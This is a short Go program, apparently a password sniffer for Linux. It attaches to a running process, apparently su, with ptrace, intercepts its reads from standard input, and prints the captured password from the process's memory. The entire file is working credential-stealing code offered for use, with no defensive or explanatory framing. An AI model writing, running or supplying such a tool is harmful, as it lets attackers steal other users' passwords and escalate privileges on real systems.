package main

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"strconv"
	"syscall"
)

const (
	SYSCALLRead     = 0
	PTRACE_PEEKUSER = 0x40 + iota
	PTRACE_POKEDATA = 0x44 + iota
	PTRACE_PEEKDATA = 0x2
	PTRACE_PEEKTEXT = 0x1
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run main.go <PID>")
		return
	}

	pidStr := os.Args[1]
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		log.Fatalf("Invalid PID: %v", err)
	}

	err = syscall.PtraceAttach(pid)
	if err != nil {
		log.Fatal(err)
	}
	defer syscall.PtraceDetach(pid)

	var regs syscall.PtraceRegs
	var readSyscallCount int

	for {
		_, err := syscall.Wait4(pid, nil, 0, nil)
		if err != nil {
			log.Fatal(err)
		}

		err = syscall.PtraceGetRegs(pid, &regs)
		if err != nil {
			log.Fatal("su process died.")
		}

		syscallNum := int(regs.Orig_rax)

		switch syscallNum {
		case SYSCALLRead:
			fd := int(regs.Rdi)
			readLength := int(regs.Rdx)

			// Check if it's reading from stdin (fd == 0) and the expected buffer size
			if fd == 0 && readLength == 511 {
				readSyscallCount++

				if readSyscallCount == 3 {
					bufferAddr := uintptr(regs.Rsi)
					buffer := make([]byte, readLength)

					_, err := syscall.PtracePeekData(pid, bufferAddr, buffer)
					if err != nil {
						log.Fatal(err)
					}
					fmt.Printf("Password captured: %s\n", bytes.SplitN(buffer, []byte{'\n'}, 2)[0])
				}
			}
		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			log.Fatal(err)
		}
	}
}
